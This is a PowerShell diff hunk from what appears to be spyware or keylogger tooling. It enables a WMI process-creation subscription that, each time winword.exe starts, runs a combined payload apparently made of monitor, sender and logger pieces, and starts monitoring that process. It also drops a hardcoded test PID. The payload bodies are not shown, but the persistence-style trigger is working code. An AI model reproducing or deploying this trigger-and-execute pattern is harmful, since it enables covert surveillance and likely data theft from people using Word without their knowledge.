@@ -79,20 +79,18 @@ function lolololol{
     if(!(Get-Handels-Method)){exit}
     $global:Payload = $MonitorPayload + $SenderPayload + $LoggerPayload + $HandlePsPayload
     if ($HandelsMethod -eq "code"){ $global:Payload += $HandlesMonitor}
-    Invoke-Expression $Payload
-    Start-Mon -ProcID 5180
 
-    #$Query = "Select * From __InstanceCreationEvent within 5 Where TargetInstance ISA 'Win32_Process'"
-    #$Identifier = "StartProcess"
-    #$ActionBlock = {
-    #    $e = $event.SourceEventArgs.NewEvent.TargetInstance
-    #    if ($e.Name -eq "winword.exe"){
-    #        Invoke-Expression $Payload
-    #        Start-Mon -ProcID $e.ProcessID
-    #    }
-    #}
-#
-    #Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock 
+    $Query = "Select * From __InstanceCreationEvent within 5 Where TargetInstance ISA 'Win32_Process'"
+    $Identifier = "StartProcess"
+    $ActionBlock = {
+        $e = $event.SourceEventArgs.NewEvent.TargetInstance
+        if ($e.Name -eq "winword.exe"){
+            Invoke-Expression $Payload
+            Start-Mon -ProcID $e.ProcessID
+        }
+    }
+
+    Register-WMIEvent -Query $Query -SourceIdentifier $Identifier -Action $ActionBlock 
 }
 
 lolololol
